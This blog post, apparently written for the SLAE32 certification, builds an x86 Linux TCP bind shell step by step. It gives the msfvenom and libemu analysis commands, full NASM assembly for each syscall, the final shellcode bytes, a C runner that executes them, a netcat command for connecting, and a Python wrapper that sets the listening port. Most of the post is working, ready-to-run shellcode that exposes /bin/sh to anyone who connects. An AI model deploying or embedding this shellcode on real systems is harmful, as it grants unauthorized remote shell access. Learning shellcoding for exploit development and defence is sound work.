---
layout: single
title: TCP Bind Shell Assembly x86 Shellcode - SLAE32 First Exam Assignment
date: 2020-6-13
classes: wide
header:
  teaser: /images/bindshellmeme.jpg
tags:

  -SLAE
--- 

## Introduction
Hello Everyone!
As part of my Infosec studies iv'e decided to take the SLAE32 course and certification inorder to sharpen up my Assembly skills and to dive in on the Shellcoding world.
I will share on my blog the 7 Assignments which are part of the SLAE32 Certification Exam provided my insightful analysis of each given assignment.

Let's Begin!


<p align="center"> 
<img src="https://raw.githubusercontent.com/NagliNagli/naglinagli.github.io/master/images/bindshellmeme.jpg">
</p>

## Assignment 1 - Creating TCP Bind Shell

In the first assignment we have been given the task to create TCP Bind Shell Shellcode, Which should be doing 3 main Instructions.

* Binds to a port
* Execs a shell on incoming connection
* The port number should be easily configurable (via wrapper (Python/C))

Inorder to create the Shellcode, there are several Syscalls which should be initialized and configured properly.
As was presented on the course, i will use libemu to analyze a working TCP Bind Shell payload (Such as the Metasploit one)

Photo representation of bindshell:

<p align="center"> 
<img src="https://raw.githubusercontent.com/NagliNagli/naglinagli.github.io/master/images/bindshellexample.png">
</p>

## Libemu

Libemu Offers basic shellcode detection and linux x86 emulation with use of GetPc heuristics.
You can install the library in two ways:

- [ ] You can download it by visiting <http://libemu.carnivore.it/>
- [ ] You can install it by using the relevant github page, following the next commands:
```bash
git clone https://github.com/buffer/libemu
cd libemu
autoreconf -v -i
./configure --prefix=/opt/libemu
autoreconf -v -i
sudo make install
```

## Analyzing the Metasploit Bind Shell Payload

After we have installed Libemu successfully, we will use it to analyze the MSF Bind Shell payload, Libemu will proviגe us with graphical overview of the shellcode,which will come in handy during this assignment.

Now, i will use the "sctest" tool within Libemu, which is a tool used for detecting and analyzing shellcode.

* Note: sctest requires input data in form of raw bytes, so we have to convert our shellcode into raw data first. 

First, i will generate our MSF shellcode in raw format, using msfvenom.

```bash
msfvenom -p linux/x86/shell_bind_tcp -f raw > bindshell.bin
```
where:
* -p payload
* -f format of generated payloads. For complete list type msfvenom --help-formats

The next step will be to utilize "sctest" on the raw version of the bind_shell.

```bash
cat bindshell.bin | ./sctest -vvv -Ss 10000 -G bindshell_shellcode.dot
dot bindshell_shellcode.dot -T png > bindshell_shellcode.png
```
where:
* -v, --verbose : be verbose, can be used multiple times, f.e. -vv
* -S, --stdin : read shellcode/buffer from stdin
* -s INTEGER : max number of steps to run
* -G FILEPATH : save a dot formatted callgraph in filepath
* -T png FILEPATH : Transform the given file into png image.

We will be presented with this graphical presentation by visiting the bindshell_shellcode.png

![bindshelllibemu](/images/bindshell_shellcode.png)

As we can infer from the graphical presentation, there are 6 main Syscall stages to assemble when creating Bind_Shell Shellcode.

- [ ] Create the socket.
- [ ] Bind the socket.
- [ ] Listen for inbound connection.
- [ ] Accept inbound connection.
- [ ] Duplicate the file descriptors using dup2
- [ ] Execute /bin/sh with execve

## Creating bind_shell.nasm

Now, We can create the assembly file going through each main stage.

First, i will find the socketcall Syscall number using the following command:

```bash
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
```
![socketsyscall](/images/socketsyscall.png)

As we can notice, socketcall Syscall number is 102 in decimal, which is 0x66 on HEX.

Now, we can dive deeper onto the specific network sys commands using net.h which is implementation of the SOCKET network access protocol on linux kernel.

```bash
grep SYS_ /usr/include/linux/net.h
```
![nethsocketcall](/images/nethsocketcall.png)

additonaly, dup2 syscall is 63 in decimal which is 0x3F in HEX as per <https://fedora.juszkiewicz.com.pl/syscalls.html>

Now, we are ready to go with bind_shell.nasm

## Create the Socket

Inorder to use the socketcall Syscall we will need to set al to the corrensponding Syscall number which is 0x66.

```c
int socketcall(int call, unsigned long *args);
```

* call –  determines which socket function to call.
* args – points to a block containing the arguments.

The first socket function which we will use is the **SYS_SOCKET** with the value of 1 (as we have discovered in the net.h file)
Hence, we will pass the value into the ebx register.

In order to create TCP Socket we need to push the following into the stack (don't forgot to push in reverse order)

1. domain – specifies a communication domain - AF_INET (2)
2. type – specifies the communication semantics - SOCK_STREAM (1)
3. protocol – specifies a particular protocol to be used with the socket - TCP protocol is 6, but we will insert (0).

* **AF_INET** is an address family that is used to designate the type of addresses that your socket can communicate with (in this case, Internet Protocol v4 addresses). 

* SOCK_STREAM means that it is a TCP socket.

* Protocol numbers - <https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml>

All the following comes down to the following code :

```c
; setting up the socket
       xor eax, eax    ; zeroing out the eax register
       mov al, 0x66    ; hex sys_socketcall (102 in decimal)

       xor ebx, ebx    ; zeroing out the ebx register
       mov bl, 0x1     ; assigning 1 to ebx register (SYS_SOCKET)

       xor esi, esi    ; zeroing out the esi register
       push esi        ; push 0 to the stack (IPPROTO_IP)
       push ebx        ; push 1 to the stack (SOCK_STREAM)
       push 0x2        ; push 2 to the stack (AF_INET)

       mov ecx, esp    ; keep 1st argument address in ecx
       int 0x80         ; syscall
```

After the following code snippet, the socket file descriptor returns to the **eax** register value.

## Bind the Socket

Inorder to bind the socket, i will use the **SYS_BIND** function which will assign an address to the socket.

```c
int bind(int sockfd, const struct sockaddr *addr,
                socklen_t addrlen);
```
The value for the SYS_BIND function is 2 (as we have discovered in the net.h file)

As we can notice from the code above, the bind function requires 3 arguments.

1. sockfd - Socket file descriptor.
2. Structure called sockaddr, 
```c
struct sockaddr {
   unsigned short   sa_family;
   char             sa_data[14];
};
```
* sa_family -  It represents an address family. In most of the Internet-based applications, we use AF_INET.
* sa_data - The content of the 14 bytes of protocol specific address are interpreted according to the type of address. For the Internet family, we will use port number IP address, which is represented by sockaddr_in structure defined below.

```c
struct sockaddr_in {
   short int            sin_family;
   unsigned short int   sin_port;
   struct in_addr       sin_addr;
   unsigned char        sin_zero[8];
};
```
3. addrlen - Address length.

Now, we will create the sockaddr structure, with the following values (note that the values are inserted in reverse order):

1. push 0 to the stack - the address which we will bind the socket to (0.0.0.0)
2. push the relevant port number (4444) which is 0x115C in HEX.
3. push the value 2 (AF_INET).
4. save the structure in the **ecx** register.

Next, we will push the bind function arguments (reversed):
* the sockfd which is stored on the **edi** register
* the structure on **ecx** register
* the value 16 (the address length)

All the following comes down to the following code :

```c
; Bind the socket

       xchg edi, eax   ; save the file descriptor returned to eax in the edi register

       xor eax, eax
       mov al, 0x66    ; making sure we are on the socketcall syscall.

       push esi        ; esi value is 0, specifing the bind address (0.0.0.0)
       push word 0x5C11        ; push the port number (4444)

       inc ebx         ; ebx value is 2, (SYS_BIND)
       push bx

       mov ecx, esp    ; keep 1st argument address in ecx.

       push byte 16    ; push the address length (addrlen)
       push ecx        ; sockaddr structure
       push edi        ; socketfd (file descriptors)
       mov ecx, esp    ; ecx holds the args array for the syscall
       int 0x80        ; init syscall
```

## Listen for inbound connection
Inorder to listen for inbound connection , i will use the **SYS_LISTEN** with the value of 4.

```c
int listen(int sockfd, int backlog);
```

The listen function requires 2 arguments:

1. sockfd - Socket file descriptor.
2. backlog - The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.

All the following comes down to the following code :

```c
; Listen for inbound connection

       xor eax,eax
       xor ebx,ebx

       mov al, 0x66
       mov bl, 0x4     ; ebx value is now 4, (SYS_LISTEN)

       push esi        ; push the value 0 as the backlog
       push edi        ; push the file descriptors
       mov ecx, esp    ; ecx hold the args array for the syscall
       int 0x80        ; init syscall
```

## Accept connection request

Inorder to accept connection request , i will use the **SYS_ACCEPT** with the value of 5.

```c
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```

The accept function requires 3 arguments:

1. sockfd - Socket file descriptor.
2. sockaddr structure (NULL)
3. address length (NULL)

All the following comes down to the following code :

```c
; Accept inbound connection request

       mov al, 0x66
       inc bl          ; ebx value is not 5, (SYS_ACCEPT)
       push esi        ; push NULL as the addrlen
       push esi        ; push NULL as the sockaddr structure
       push edi        ; push the file descriptor
       mov ecx, esp    ; ecx hold the args array for the syscall
       int 0x80        ; init syscall

```

## Redirect the file descriptors using dup2

Now, the socket is ready to accept inbound connection request.
I will use the **SYS_DUP2** with the value of 0x3F in HEX to accomplish this task.

```c
int dup2(int oldfd, int newfd);
```
The accept function requires 2 arguments:
1. oldfd - the old file descriptor value
2. newfd - the new file descriptor value

We will redirect the file descriptors stdin (0), stdout (1) and stderr(2) to the client socketfd,
Intotal we will have to use the dup2 function 3 times, hence using a loop will come in handy.

All the following comes down to the following code :

```c
; Redirect the file descriptors using dup2

       xchg ebx, eax   ; Moving the file descriptor to ebx
       xor ecx, ecx    ; clearing ecx before using the loop
       mov cl, 0x2     ; setting the loop counter

looper:
       mov al, 0x3F    ; inserting the hex SYS_DUP2 syscall
       int 0x80        ; syscall
       dec ecx         ; the argument for file descriptor(2-stderr,1-stdout,0-stdin)
       jns looper
```

## Execute /bin/sh with execve
Now, for the final step, we want to execute /bin/sh
I will use the **SYS_EXECVE** Syscall with the value of 0xB

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```
The execve function requires 3 arguments:
1. pathname - a pointer to the filename we want to execute.
2. argv - is an array of pointers to strings passed to the new program as its command-line arguments.
3. envp - envp is an array of pointers to strings.

I will take notes from the execve-stack.nasm code presented on the SLAE course as the corrensponding code.

All the following comes down to the following code :

```c
; Execute /bin/sh with execve

       xor eax, eax
       push eax

       ; PUSH //bin/sh (8 bytes)

       push 0x68732f2f
       push 0x6e69622f

       mov ebx, esp

       push eax
       mov edx, esp

       push ebx
       mov ecx, esp


       mov al, 0xB     ; inserting the hex for SYS_EXECVE Syscall
       int 0x80

```

## Assembling and linking

Now, we have completed writing bind_shell.nasm file.

I will Assemble and link it with the following complie.sh bash script:

```c
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o

echo '[+] Done!'

echo '[+] Printing the Shellcode:'

objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

The shellcode output:

```c
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x97\x31\xc0\xb0\x66\x56\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\x31\xdb\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\xfe\xc3\x56\x56\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```
I will insert the shellcode on generic shellcode runner c program presented :

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x97\x$


main()
{

       printf("Shellcode Length:  %d\n", strlen(code));

       int (*ret)() = (int(*)())code;

       ret();

}
```

Creating the executable
```c
gcc shellcode.c -fno-stack-protector -z execstack -o shellcode_bind
```

Running the shellcode:
```c
./shellcode_bind
```
Connecting to the bind shell:

```c
nc -nv 127.0.0.1 4444
```

![shellcode](/images/shellcode.png)

And thats about it, we have a running shellcode executing /bin/sh on port 4444.
The only thing left is to make port configuration easy to use!

## Port configuration using python wrapper

I have written a python script which will come in handy when configuring our bind shell to different port than 4444.

The following image explains the whole proccess of running the shellcode on port 7777 (as example):

![7777bindshell](/images/7777bindshell.png)

The python code snippet is presented below:

```python
#!/usr/bin/python

# Bind Shell TCP python wrapper (port configuration
# Author:  Gal Nagli
# Blog: naglinagli.github.io


import socket
import sys

shell1 =  ""
shell1 += "\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xf6\\x56\\x53\\x6a\\x02\\x89\\xe1"
shell1 += "\\xcd\\x80\\x97\\x31\\xc0\\xb0\\x66\\x56\\x66\\x68"
shell2 = ""
shell2 += "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc0\\x31"
shell2 += "\\xdb\\xb0\\x66\\xb3\\x04\\x56\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xfe\\xc3\\x56"
shell2 += "\\x56\\x57\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49"
shell2 += "\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89"
shell2 += "\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) != 2:
	print "You must enter a port number."
	exit
else:

	try:

		portNumber = sys.argv[1]
		portNumber = int(portNumber)
		if portNumber > 65535 or portNumber < 1:
			print "Please stay in the port range"
			exit()
		portNumber = socket.htons(portNumber)
		portNumber = hex(portNumber)

		firstPortNum = portNumber[2:4]
		secondPortNum = portNumber[4:6]

		firstPortNum = str(firstPortNum)
		firstPortNum = "\\x" + firstPortNum

		secondPortNum = str(secondPortNum)
		secondPortNum = "\\x" + secondPortNum

		combined = secondPortNum + firstPortNum

		shell = shell1 + combined + shell2

	
		print shell

	except:
	
		print "The program has failed, Please try again." 

```
And that's a wrap!

Thank you very much for sticking around!


## References

- [ ] sctest - <https://www.aldeid.com/wiki/Libemu/sctest>
- [ ] sys_dup2 - <https://man7.org/linux/man-pages/man2/dup2.2.html>
- [ ] listen syscall - <https://man7.org/linux/man-pages/man2/listen.2.html>
- [ ] accept syscall - <https://man7.org/linux/man-pages/man2/accept.2.html>
- [ ] socket syscall - <https://man7.org/linux/man-pages/man2/socket.2.html>
- [ ] bind syscall - <https://man7.org/linux/man-pages/man2/bind.2.html>


## Wrap-Up
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification

<https://www.pentesteracademy.com/course?id=3>

Student ID: SLAE - 1543

All the source code which i have used throughout the assignment is available here:
<https://github.com/NagliNagli/SLAE/tree/master/Bind_Shell>

Cheers,
Gal.
